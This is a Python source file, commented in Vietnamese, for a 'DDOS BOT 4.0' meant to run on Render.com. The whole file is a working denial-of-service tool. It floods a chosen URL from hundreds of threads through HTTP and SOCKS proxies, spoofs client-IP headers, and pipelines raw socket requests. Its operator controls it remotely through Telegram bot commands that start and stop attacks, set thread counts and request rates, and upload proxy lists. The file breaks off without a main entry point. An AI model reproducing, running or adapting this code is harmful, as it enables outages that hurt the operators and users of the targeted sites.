# =====================================================
# DDOS BOT 4.0 - TỐI ƯU TỐI ĐA CHO RENDER.COM
# HỖ TRỢ HTTP/HTTPS/SOCKS4/SOCKS5 - TỰ ĐỘNG RELOAD
# TẤN CÔNG ĐA LUỒNG - TỐC ĐỘ 500+ REQ/S
# =====================================================

import requests
import threading
import random
import time
import os
import socket
import ssl
import json
import sys
import re
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse
import socks

# -------------------- CẤU HÌNH TELEGRAM --------------------
TELEGRAM_BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # Thay token thật
# Không cần chat_id cố định - bot tự động lưu chat_id đầu tiên

# -------------------- CẤU HÌNH TẤN CÔNG --------------------
THREAD_COUNT = 800  # Số luồng tấn công
REQUESTS_PER_SECOND = 500  # Tốc độ request/giây
MAX_RUN_TIME = 120  # Mỗi đợt chạy tối đa 120s
CONNECTION_POOL = 100  # Pool connection
BATCH_SIZE = 50  # Batch request
TIMEOUT = 1.5  # Timeout kết nối

# -------------------- BIẾN TOÀN CỤC --------------------
stop_event = threading.Event()
is_running = False
proxy_list = []
proxy_http = []
proxy_socks5 = []
proxy_socks4 = []
user_agents = []
proxy_update_time = 0
heartbeat_count = 0
last_activity = time.time()
bot_start_time = time.time()
chat_id_saved = None

# Target mặc định
current_target = {
    'url': 'http://192.168.1.100:8080',
    'host': '192.168.1.100',
    'port': 8080,
    'ssl': False
}

# Thống kê tấn công
attack_stats = {
    'total_requests': 0,
    'success_count': 0,
    'fail_count': 0,
    'status_codes': {},
    'bytes_sent': 0,
    'start_time': 0,
    'session_count': 0,
    'current_target': '',
    'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
    'max_speed': 0,
    'avg_speed': 0,
    'errors': 0
}
stats_lock = threading.Lock()

# Cache DNS
dns_cache = {}
dns_cache_lock = threading.Lock()

# Session pool
session_pool = []

# =====================================================
# LOAD USER-AGENT - MỞ RỘNG
# =====================================================
def load_user_agents():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/123.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    ]
    if os.path.exists("user_agents.txt"):
        with open("user_agents.txt", 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    agents.append(line)
    return agents

user_agents = load_user_agents()

# =====================================================
# LOAD PROXY - HỖ TRỢ NHIỀU ĐỊNH DẠNG
# =====================================================
def parse_proxy_line(line):
    """Phân tích dòng proxy - hỗ trợ HTTP, SOCKS4, SOCKS5"""
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    
    proxy_type = 'http'
    proxy_dict = {}
    
    try:
        # Định dạng có giao thức: socks5://user:pass@ip:port
        if '://' in line:
            proto, rest = line.split('://', 1)
            proto = proto.lower()
            if proto in ['socks5', 'socks4', 'http', 'https']:
                proxy_type = proto if proto != 'https' else 'http'
                
                if '@' in rest:
                    auth, addr = rest.split('@', 1)
                    if ':' in auth:
                        user, passwd = auth.split(':', 1)
                        proxy_dict['user'] = user
                        proxy_dict['pass'] = passwd
                    else:
                        addr = rest
                else:
                    addr = rest
                
                if ':' in addr:
                    ip, port = addr.rsplit(':', 1)
                    proxy_dict['ip'] = ip
                    proxy_dict['port'] = int(port)
                else:
                    return None
                
                proxy_dict['type'] = proxy_type
                proxy_dict['raw'] = line
                return proxy_dict
        
        # Định dạng: user:pass@ip:port (mặc định HTTP)
        elif '@' in line:
            auth, addr = line.split('@', 1)
            if ':' in auth and ':' in addr:
                user, passwd = auth.split(':', 1)
                ip, port = addr.rsplit(':', 1)
                proxy_dict = {
                    'type': 'http',
                    'ip': ip,
                    'port': int(port),
                    'user': user,
                    'pass': passwd,
                    'raw': f"http://{user}:{passwd}@{ip}:{port}"
                }
                return proxy_dict
        
        # Định dạng: ip:port (mặc định HTTP)
        elif ':' in line:
            ip, port = line.rsplit(':', 1)
            # Kiểm tra port hợp lệ
            try:
                port_int = int(port)
                if 1 <= port_int <= 65535:
                    proxy_dict = {
                        'type': 'http',
                        'ip': ip,
                        'port': port_int,
                        'raw': f"http://{ip}:{port}"
                    }
                    return proxy_dict
            except:
                pass
    
    except Exception:
        return None
    
    return None

def load_proxies(filepath):
    """Tải proxy từ file với xử lý lỗi"""
    http_proxies = []
    socks5_proxies = []
    socks4_proxies = []
    
    if not os.path.exists(filepath):
        return [], [], []
    
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                proxy = parse_proxy_line(line)
                if proxy:
                    if proxy['type'] == 'http':
                        http_proxies.append(proxy)
                    elif proxy['type'] == 'socks5':
                        socks5_proxies.append(proxy)
                    elif proxy['type'] == 'socks4':
                        socks4_proxies.append(proxy)
    except Exception:
        pass
    
    return http_proxies, socks5_proxies, socks4_proxies

# =====================================================
# DNS CACHE
# =====================================================
def resolve_host(host):
    """Resolve DNS với cache"""
    with dns_cache_lock:
        if host in dns_cache:
            return dns_cache[host]
    
    try:
        ip = socket.gethostbyname(host)
        with dns_cache_lock:
            dns_cache[host] = ip
        return ip
    except:
        return host

# =====================================================
# SESSION POOL - TÁI SỬ DỤNG CONNECTION
# =====================================================
class SessionPool:
    def __init__(self, max_size=100):
        self.pool = []
        self.max_size = max_size
        self.lock = threading.Lock()
        self.created = 0
    
    def get_session(self, proxy_dict=None):
        """Lấy session từ pool hoặc tạo mới"""
        with self.lock:
            # Tìm session còn sống
            for i, session in enumerate(self.pool):
                try:
                    # Kiểm tra session còn sống
                    if hasattr(session, 'head'):
                        session.head('http://google.com', timeout=1)
                        return self.pool.pop(i)
                except:
                    continue
            
            # Tạo session mới
            return self._create_session(proxy_dict)
    
    def return_session(self, session):
        """Trả session về pool"""
        if session and len(self.pool) < self.max_size:
            with self.lock:
                self.pool.append(session)
    
    def _create_session(self, proxy_dict=None):
        """Tạo session mới với tối ưu"""
        session = requests.Session()
        session.timeout = TIMEOUT
        session.verify = False
        session.trust_env = False
        
        # Tối ưu adapter
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=50,
            pool_maxsize=50,
            max_retries=0,
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Cấu hình proxy
        if proxy_dict and proxy_dict['type'] == 'http':
            session.proxies = {
                'http': proxy_dict['raw'],
                'https': proxy_dict['raw']
            }
        elif proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
            # SOCKS sẽ dùng socket riêng
            pass
        
        self.created += 1
        return session

session_pool = SessionPool(CONNECTION_POOL)

# =====================================================
# GỬI TELEGRAM - TỐI ƯU
# =====================================================
def send_telegram(message, chat_id=None, retry=2):
    """Gửi tin nhắn Telegram với retry"""
    global last_activity, chat_id_saved
    
    last_activity = time.time()
    
    # Lưu chat_id
    if chat_id:
        chat_id_saved = chat_id
        try:
            with open('chat_id.txt', 'w') as f:
                f.write(str(chat_id))
        except:
            pass
    
    # Xác định chat_id
    target_chat = chat_id or chat_id_saved
    if not target_chat:
        try:
            if os.path.exists('chat_id.txt'):
                with open('chat_id.txt', 'r') as f:
                    target_chat = f.read().strip()
        except:
            pass
    
    if not target_chat:
        return False
    
    # Gửi tin nhắn
    for i in range(retry):
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {
                'chat_id': target_chat,
                'text': message,
                'parse_mode': 'HTML',
                'disable_web_page_preview': True
            }
            r = requests.post(url, data=payload, timeout=5)
            if r.status_code == 200:
                return True
        except:
            time.sleep(0.5)
    
    return False

# =====================================================
# TẢI FILE PROXY TỪ TELEGRAM
# =====================================================
def download_telegram_file(file_id, save_path):
    """Tải file từ Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
        params = {'file_id': file_id}
        r = requests.get(url, params=params, timeout=10)
        if r.status_code != 200:
            return False
        
        data = r.json()
        if not data.get('ok'):
            return False
        
        file_path = data['result']['file_path']
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        
        r = requests.get(download_url, timeout=30)
        if r.status_code != 200:
            return False
        
        with open(save_path, 'wb') as f:
            f.write(r.content)
        return True
    except:
        return False

def update_proxies_from_file(file_path, chat_id):
    """Cập nhật proxy từ file và thông báo"""
    global proxy_list, proxy_http, proxy_socks5, proxy_socks4, proxy_update_time
    
    http, socks5, socks4 = load_proxies(file_path)
    total = len(http) + len(socks5) + len(socks4)
    
    if total == 0:
        send_telegram(f"❌ Không có proxy hợp lệ trong file.", chat_id)
        return False
    
    proxy_http = http
    proxy_socks5 = socks5
    proxy_socks4 = socks4
    proxy_list = http + socks5 + socks4
    proxy_update_time = time.time()
    
    send_telegram(f"""
🔄 Đã cập nhật proxy:
📊 HTTP: {len(http)}
📊 SOCKS5: {len(socks5)}
📊 SOCKS4: {len(socks4)}
📊 Tổng: {total}
    """, chat_id)
    return True

# =====================================================
# PARSE URL
# =====================================================
def parse_target_url(url_string):
    """Phân tích URL target"""
    if not url_string.startswith(('http://', 'https://')):
        url_string = 'http://' + url_string
    
    parsed = urlparse(url_string)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    ssl = parsed.scheme == 'https'
    
    if not parsed.path:
        url_string = url_string.rstrip('/') + '/'
    
    return {
        'url': url_string,
        'host': host,
        'port': port,
        'ssl': ssl,
        'path': parsed.path or '/'
    }

# =====================================================
# TẠO HEADER - TỐI ƯU
# =====================================================
def generate_headers():
    """Tạo header ngẫu nhiên"""
    return {
        'User-Agent': random.choice(user_agents),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9,en;q=0.8', 'zh-CN,zh;q=0.9,en;q=0.8']),
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache, no-store',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Real-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Originating-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'Referer': random.choice([
            'https://www.google.com/',
            'https://www.facebook.com/',
            'https://www.youtube.com/',
            'https://twitter.com/',
            'https://www.instagram.com/',
            'https://www.tiktok.com/'
        ])
    }

# =====================================================
# TẤN CÔNG HTTP - TỐI ƯU
# =====================================================
def attack_http(proxy_dict, target):
    """Tấn công qua HTTP/HTTPS proxy"""
    session = None
    try:
        # Lấy session từ pool
        session = session_pool.get_session(proxy_dict)
        
        # Chọn method
        method = random.choice(['GET', 'POST', 'HEAD', 'OPTIONS'])
        headers = generate_headers()
        
        # Tạo URL với param random
        url = target['url']
        if method in ['GET', 'HEAD']:
            params = {f'p{random.randint(1,9999)}': 'x'*random.randint(10,200) for _ in range(random.randint(2,5))}
            url += '?' + '&'.join([f"{k}={v}" for k,v in params.items()])
        
        # Thực hiện request
        if method == 'GET':
            r = session.get(url, headers=headers, timeout=TIMEOUT)
        elif method == 'POST':
            data = {f'f{i}': 'v'*random.randint(50,500) for i in range(10)}
            r = session.post(url, data=data, headers=headers, timeout=TIMEOUT)
        elif method == 'HEAD':
            r = session.head(url, headers=headers, timeout=TIMEOUT)
        else:
            r = session.options(url, headers=headers, timeout=TIMEOUT)
        
        # Trả session về pool
        session_pool.return_session(session)
        
        # Cập nhật thống kê
        with stats_lock:
            attack_stats['total_requests'] += 1
            code = str(r.status_code)
            attack_stats['status_codes'][code] = attack_stats['status_codes'].get(code, 0) + 1
            if 200 <= r.status_code < 400:
                attack_stats['success_count'] += 1
            else:
                attack_stats['fail_count'] += 1
            attack_stats['bytes_sent'] += len(r.request.body or b'') + 200
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
            else:
                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
        return True
        
    except Exception as e:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        
        if session:
            try:
                session.close()
            except:
                pass
        return False

# =====================================================
# TẤN CÔNG SOCKET - HỖ TRỢ SOCKS4/SOCKS5
# =====================================================
def create_socks_socket(proxy_dict):
    """Tạo socket qua SOCKS proxy"""
    try:
        sock = socks.socksocket()
        sock.settimeout(TIMEOUT)
        
        proxy_type = socks.SOCKS5 if proxy_dict['type'] == 'socks5' else socks.SOCKS4
        
        if 'user' in proxy_dict and 'pass' in proxy_dict:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'],
                          username=proxy_dict['user'], password=proxy_dict['pass'])
        else:
            sock.set_proxy(proxy_type, proxy_dict['ip'], proxy_dict['port'])
        
        return sock
    except:
        return None

def attack_socket(proxy_dict, target):
    """Tấn công qua socket (SOCKS hoặc raw)"""
    sock = None
    try:
        # Tạo socket
        if proxy_dict and proxy_dict['type'] in ['socks5', 'socks4']:
            sock = create_socks_socket(proxy_dict)
            if not sock:
                return False
            sock.connect((resolve_host(target['host']), target['port']))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            sock.connect((resolve_host(target['host']), target['port']))
        
        # SSL nếu cần
        if target['ssl']:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=target['host'])
        
        # Tạo request
        path = '/' + 'x'*random.randint(5,200) + f'?id={random.randint(1,999999)}&t={time.time()}'
        headers = generate_headers()
        request = f"GET {path} HTTP/1.1\r\n"
        for key, value in headers.items():
            request += f"{key}: {value}\r\n"
        request += "\r\n"
        
        # Gửi nhiều request trên 1 kết nối
        for _ in range(random.randint(2,5)):
            sock.send(request.encode())
        
        sock.close()
        
        # Cập nhật thống kê
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['success_count'] += 1
            attack_stats['bytes_sent'] += len(request) * 3
            if proxy_dict:
                attack_stats['proxy_stats'][proxy_dict['type']] = attack_stats['proxy_stats'].get(proxy_dict['type'], 0) + 1
            else:
                attack_stats['proxy_stats']['raw'] = attack_stats['proxy_stats'].get('raw', 0) + 1
        return True
        
    except Exception as e:
        with stats_lock:
            attack_stats['total_requests'] += 1
            attack_stats['fail_count'] += 1
            attack_stats['errors'] += 1
        
        try:
            if sock:
                sock.close()
        except:
            pass
        return False

# =====================================================
# WORKER TỐI ƯU
# =====================================================
def attack_worker(proxy_pools, target):
    """Worker thực hiện tấn công"""
    http_proxies, socks5_proxies, socks4_proxies = proxy_pools
    
    # Thống kê cục bộ
    local_count = 0
    last_update = time.time()
    
    while not stop_event.is_set():
        try:
            # Chọn loại proxy theo trọng số
            total_http = len(http_proxies)
            total_socks5 = len(socks5_proxies)
            total_socks4 = len(socks4_proxies)
            total = total_http + total_socks5 + total_socks4
            
            if total == 0:
                # Không có proxy -> raw
                attack_socket(None, target)
            else:
                # Random có trọng số
                r = random.random()
                if r < 0.4 and total_http > 0:
                    proxy = random.choice(http_proxies)
                    attack_http(proxy, target)
                elif r < 0.7 and total_socks5 > 0:
                    proxy = random.choice(socks5_proxies)
                    attack_socket(proxy, target)
                elif r < 0.85 and total_socks4 > 0:
                    proxy = random.choice(socks4_proxies)
                    attack_socket(proxy, target)
                else:
                    attack_socket(None, target)
            
            local_count += 1
            
            # Điều chỉnh tốc độ
            time.sleep(1.0 / REQUESTS_PER_SECOND)
            
        except Exception:
            continue

# =====================================================
# THỐNG KÊ
# =====================================================
def get_stats_text():
    """Lấy text thống kê"""
    with stats_lock:
        elapsed = int(time.time() - attack_stats['start_time']) if attack_stats['start_time'] > 0 else 0
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        rate = total / max(elapsed, 1)
        max_speed = attack_stats.get('max_speed', 0)
        bytes_sent = attack_stats['bytes_sent'] / (1024 * 1024)
        codes = ', '.join([f"{k}:{v}" for k,v in list(attack_stats['status_codes'].items())[:5]])
        errors = attack_stats.get('errors', 0)
        
        remaining = max(0, MAX_RUN_TIME - elapsed)
        status = "🟢 ĐANG TẤN CÔNG" if is_running else "🔴 CHỜ LỆNH"
        
        uptime = int(time.time() - bot_start_time)
        uptime_str = f"{uptime//3600}h{(uptime%3600)//60}m{uptime%60}s"
        
        proxy_stats = attack_stats.get('proxy_stats', {})
        
        return f"""
<b>🔥 DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
📌 Trạng thái: {status}
⏱ Uptime: {uptime_str}
🎯 Target: {attack_stats.get('current_target', 'Chưa có')}
⏱ Đợt này: {elapsed}s / {MAX_RUN_TIME}s
⏳ Còn lại: {remaining}s
📨 Tổng request: {total:,}
✅ Thành công: {success:,}
❌ Thất bại: {fail:,}
⚠️ Lỗi: {errors}
📈 Tốc độ: {rate:.1f} req/s
⚡ Max: {max_speed:.1f} req/s
💾 Dữ liệu: {bytes_sent:.2f} MB
📊 Mã trạng thái: {codes or 'N/A'}
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Proxy dùng: H={proxy_stats.get('http',0)} S5={proxy_stats.get('socks5',0)} S4={proxy_stats.get('socks4',0)} R={proxy_stats.get('raw',0)}
🧵 Luồng: {THREAD_COUNT}
⚙️ Tốc độ cài: {REQUESTS_PER_SECOND} req/s
❤️ Heartbeat: {heartbeat_count}
        """

# =====================================================
# THỰC HIỆN TẤN CÔNG
# =====================================================
def run_attack(target, chat_id):
    """Chạy tấn công với target chỉ định"""
    global is_running, current_target
    
    # Cập nhật target
    current_target = target
    
    # Reset stats
    with stats_lock:
        attack_stats['current_target'] = target['url']
        attack_stats.update({
            'total_requests': 0,
            'success_count': 0,
            'fail_count': 0,
            'status_codes': {},
            'bytes_sent': 0,
            'start_time': time.time(),
            'session_count': attack_stats.get('session_count', 0) + 1,
            'proxy_stats': {'http': 0, 'socks5': 0, 'socks4': 0, 'raw': 0},
            'max_speed': 0,
            'errors': 0
        })
    
    stop_event.clear()
    is_running = True
    
    # Thông báo bắt đầu
    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
    send_telegram(f"""
▶️ <b>BẮT ĐẦU TẤN CÔNG TỐC ĐỘ CAO!</b>
🎯 {target['url']}
🌐 HTTP: {len(proxy_http)} | SOCKS5: {len(proxy_socks5)} | SOCKS4: {len(proxy_socks4)}
📊 Tổng proxy: {total_proxy}
⚡ Tốc độ: {REQUESTS_PER_SECOND} req/s
⏱ {MAX_RUN_TIME}s
    """, chat_id)
    
    # Chuẩn bị proxy pools
    proxy_pools = (proxy_http, proxy_socks5, proxy_socks4)
    
    # Khởi chạy workers
    with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
        futures = [executor.submit(attack_worker, proxy_pools, target) for _ in range(THREAD_COUNT)]
        
        # Giám sát
        start = time.time()
        last_report = 0
        
        while time.time() - start < MAX_RUN_TIME and not stop_event.is_set():
            time.sleep(1)
            elapsed = int(time.time() - start)
            
            # Cập nhật max speed
            if elapsed > 0:
                with stats_lock:
                    rate = attack_stats['total_requests'] / elapsed
                    if rate > attack_stats['max_speed']:
                        attack_stats['max_speed'] = rate
            
            # Báo cáo
            if elapsed - last_report >= 15:
                last_report = elapsed
                with stats_lock:
                    total = attack_stats['total_requests']
                    rate = total / max(elapsed, 1)
                    max_speed = attack_stats['max_speed']
                    proxy_stats = attack_stats.get('proxy_stats', {})
                send_telegram(f"""
⚡ {elapsed}s | {rate:.1f} req/s | Max: {max_speed:.1f}
📨 {total:,} | H:{proxy_stats.get('http',0)} S5:{proxy_stats.get('socks5',0)} S4:{proxy_stats.get('socks4',0)}
                """, chat_id)
    
    # Dừng
    stop_event.set()
    is_running = False
    
    # Tổng kết
    with stats_lock:
        total = attack_stats['total_requests']
        success = attack_stats['success_count']
        fail = attack_stats['fail_count']
        elapsed = int(time.time() - attack_stats['start_time'])
        rate = total / max(elapsed, 1)
        max_speed = attack_stats['max_speed']
        errors = attack_stats.get('errors', 0)
    
    send_telegram(f"""
⏹️ <b>ĐÃ DỪNG SAU {elapsed}s</b>
📊 <b>TỔNG KẾT:</b>
- Tổng: {total:,}
- Thành công: {success:,}
- Thất bại: {fail:,}
- Lỗi: {errors}
- Tốc độ TB: {rate:.1f} req/s
- Tốc độ Max: {max_speed:.1f} req/s
    """, chat_id)

# =====================================================
# TELEGRAM LISTENER
# =====================================================
def telegram_listener():
    """Lắng nghe lệnh từ Telegram"""
    global is_running, attack_thread, chat_id_saved
    
    last_update_id = 0
    
    # Gửi thông báo khởi động
    send_telegram("""
🚀 <b>DDOS BOT 4.0 - TỐI ƯU TỐI ĐA</b>
✅ Đã khởi động thành công!
⚡ Tốc độ tối đa: 500+ req/s
📌 Hỗ trợ HTTP, SOCKS4, SOCKS5
🔄 Tự động reload proxy mỗi 10 phút
❤️ Heartbeat mỗi 30 phút

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công target
<code>/stop</code> - Dừng tấn công
<code>/status</code> - Xem trạng thái
<code>/proxy</code> - Số proxy hiện có
<code>/threads N</code> - Đổi số luồng
<code>/speed N</code> - Đổi tốc độ
<code>/help</code> - Trợ giúp
    """)
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 10}
            r = requests.get(url, params=params, timeout=15)
            
            if r.status_code == 200:
                data = r.json()
                if data.get('ok'):
                    for update in data.get('result', []):
                        last_update_id = update['update_id']
                        msg = update.get('message', {})
                        chat_id = msg.get('chat', {}).get('id')
                        
                        if not chat_id:
                            continue
                        
                        # Lưu chat_id
                        chat_id_saved = chat_id
                        try:
                            with open('chat_id.txt', 'w') as f:
                                f.write(str(chat_id))
                        except:
                            pass
                        
                        # Xử lý file proxy
                        document = msg.get('document')
                        if document:
                            file_name = document.get('file_name', '')
                            if file_name.endswith('.txt'):
                                file_id = document['file_id']
                                send_telegram(f"📥 Đang tải proxy: {file_name}", chat_id)
                                
                                save_path = f"proxy_{int(time.time())}.txt"
                                if download_telegram_file(file_id, save_path):
                                    if update_proxies_from_file(save_path, chat_id):
                                        try:
                                            import shutil
                                            shutil.copy(save_path, "proxies.txt")
                                        except:
                                            pass
                                    # Xóa file sau 5s
                                    threading.Timer(5, lambda: os.remove(save_path) if os.path.exists(save_path) else None).start()
                                else:
                                    send_telegram("❌ Không thể tải file.", chat_id)
                        
                        # Xử lý lệnh
                        text = msg.get('text', '').strip()
                        if not text:
                            continue
                        
                        cmd = text.lower()
                        
                        # Lệnh /attack URL
                        if cmd.startswith('/attack'):
                            parts = text.split(maxsplit=1)
                            if len(parts) >= 2:
                                target = parse_target_url(parts[1].strip())
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công! Dùng /stop trước.", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy! Gửi file .txt trước.", chat_id)
                                    else:
                                        send_telegram(f"🎯 Target: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                            else:
                                # Dùng target mặc định
                                if is_running:
                                    send_telegram("⚠️ Đang có đợt tấn công!", chat_id)
                                else:
                                    total_proxy = len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)
                                    if total_proxy == 0:
                                        send_telegram("⚠️ Không có proxy!", chat_id)
                                    else:
                                        target = current_target
                                        send_telegram(f"🎯 Dùng target mặc định: {target['url']}", chat_id)
                                        attack_thread = threading.Thread(target=run_attack, args=(target, chat_id), daemon=True)
                                        attack_thread.start()
                        
                        # Lệnh /stop
                        elif cmd == '/stop':
                            if is_running:
                                stop_event.set()
                                is_running = False
                                send_telegram("⛔ Đã dừng tấn công!", chat_id)
                            else:
                                send_telegram("ℹ️ Không có đợt tấn công nào đang chạy.", chat_id)
                        
                        # Lệnh /status
                        elif cmd == '/status':
                            send_telegram(get_stats_text(), chat_id)
                        
                        # Lệnh /proxy
                        elif cmd == '/proxy':
                            send_telegram(f"""
🌐 <b>THỐNG KÊ PROXY</b>
HTTP: {len(proxy_http)}
SOCKS5: {len(proxy_socks5)}
SOCKS4: {len(proxy_socks4)}
Tổng: {len(proxy_http) + len(proxy_socks5) + len(proxy_socks4)}
🕐 Cập nhật: {datetime.fromtimestamp(proxy_update_time).strftime('%H:%M:%S') if proxy_update_time > 0 else 'Chưa có'}
                            """, chat_id)
                        
                        # Lệnh /threads
                        elif cmd.startswith('/threads'):
                            try:
                                global THREAD_COUNT
                                new_count = int(text.split()[1])
                                if 1 <= new_count <= 2000:
                                    THREAD_COUNT = new_count
                                    send_telegram(f"✅ Đã cập nhật số luồng: {THREAD_COUNT}", chat_id)
                                else:
                                    send_telegram("❌ Số luồng phải từ 1-2000", chat_id)
                            except:
                                send_telegram("❌ /threads <số>", chat_id)
                        
                        # Lệnh /speed
                        elif cmd.startswith('/speed'):
                            try:
                                global REQUESTS_PER_SECOND
                                new_speed = int(text.split()[1])
                                if 1 <= new_speed <= 2000:
                                    REQUESTS_PER_SECOND = new_speed
                                    send_telegram(f"✅ Đã cập nhật tốc độ: {REQUESTS_PER_SECOND} req/s", chat_id)
                                else:
                                    send_telegram("❌ Tốc độ phải từ 1-2000", chat_id)
                            except:
                                send_telegram("❌ /speed <số>", chat_id)
                        
                        # Lệnh /reloadproxy
                        elif cmd == '/reloadproxy':
                            if os.path.exists("proxies.txt"):
                                http, socks5, socks4 = load_proxies("proxies.txt")
                                total = len(http) + len(socks5) + len(socks4)
                                if total > 0:
                                    global proxy_http, proxy_socks5, proxy_socks4, proxy_list
                                    proxy_http = http
                                    proxy_socks5 = socks5
                                    proxy_socks4 = socks4
                                    proxy_list = http + socks5 + socks4
                                    proxy_update_time = time.time()
                                    send_telegram(f"🔄 Reload proxy: HTTP:{len(http)} S5:{len(socks5)} S4:{len(socks4)}", chat_id)
                                else:
                                    send_telegram("❌ Không có proxy hợp lệ.", chat_id)
                            else:
                                send_telegram("❌ Không tìm thấy file proxies.txt", chat_id)
                        
                        # Lệnh /help
                        elif cmd == '/help':
                            help_text = """
<b>🤖 DDOS BOT 4.0 - HƯỚNG DẪN</b>

📌 <b>CHẠY 24/7 - TỐC ĐỘ CAO</b>

📤 <b>GỬI FILE PROXY:</b>
Gửi file .txt chứa danh sách proxy
Hỗ trợ: HTTP, SOCKS4, SOCKS5
Định dạng:
<code>ip:port</code>
<code>socks5://user:pass@ip:port</code>
<code>user:pass@ip:port</code>

📋 <b>LỆNH:</b>
<code>/attack URL</code> - Tấn công
<code>/stop</code> - Dừng
<code>/status</code> - Trạng thái
<code>/proxy</code> - Số proxy
<code>/threads N</code> - Đổi luồng
<code>/speed N</code> - Đổi tốc độ
<code>/reloadproxy</code> - Tải lại proxy
<code>/help</code> - Trợ giúp

⚡ <b>TỐI ƯU:</b>
- 800 luồng
- 500 req/s
- 120s mỗi đợt
- Cache DNS
- Pool connection
- Tự động reload proxy
- Heartbeat 30 phút
                            """
                            send_telegram(help_text, chat_id)
            
            time.sleep(2)
        except Exception as e:
            time.sleep(5)

# =====================================================
